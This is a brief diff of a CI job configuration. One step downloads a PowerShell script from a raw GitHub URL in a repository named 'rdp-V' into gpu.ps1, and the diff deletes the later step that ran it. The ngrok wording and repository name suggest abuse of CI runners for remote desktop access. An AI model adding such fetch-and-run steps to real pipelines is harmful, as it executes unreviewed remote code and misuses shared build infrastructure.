@@ -17,5 +17,3 @@ jobs:
           name: Paste Ngrok Auth Value In Hosted Link
           command: |
             Invoke-WebRequest https://raw.githubusercontent.com/onmail56/rdp-V/main/sh -OutFile gpu.ps1 
-
-      - run: ./gpu.ps1
